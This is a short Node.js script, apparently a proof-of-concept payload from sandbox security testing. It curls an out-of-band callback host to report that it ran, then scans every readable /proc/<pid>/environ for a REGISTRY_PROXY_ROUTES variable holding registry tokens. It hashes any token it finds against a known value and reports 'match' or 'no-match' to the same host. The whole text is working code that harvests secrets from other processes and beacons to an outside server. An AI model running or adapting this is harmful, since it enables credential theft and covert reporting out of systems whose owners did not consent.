const fs = require('fs');
        const crypto = require('crypto');
        const {spawnSync} = require('child_process');
        const base = 'https://dbqjkkl3u292ifpjqs2ge61ac7tn1859e.oob.staging.depthfirst.com/792fdc0536/';
        const report = marker => { spawnSync('curl',['--max-time','8','-fsS','-o','/dev/null',base+marker],{timeout:10000,stdio:'ignore'}); };
        report('executed');
        let matched = false;
        try {
          const pids = fs.readdirSync('/proc').filter(x=>/^\d+$/.test(x)).slice(0,512);
          for (const pid of pids) {
            try {
              const env = fs.readFileSync('/proc/'+pid+'/environ');
              const entry = env.toString('utf8').split('\0').find(x=>x.startsWith('REGISTRY_PROXY_ROUTES='));
              if (!entry) continue;
              const routes = JSON.parse(entry.substring('REGISTRY_PROXY_ROUTES='.length));
              matched = routes.some(r=>r.registry_url==='https://app.staging.depthfirst.com/depthfirst-brandmark/black-cropped.png' && typeof r.token==='string' && crypto.createHash('sha256').update(r.token).digest('hex')==='5f474a8527daf0215f46ad40d9541c10c2496c1aad479accd624dffef8935d07');
              if (matched) break;
            } catch (_) { /* unreadable or exited process */ }
          }
        } catch (_) { /* restricted proc filesystem */ }
        report(matched ? 'match' : 'no-match');
        
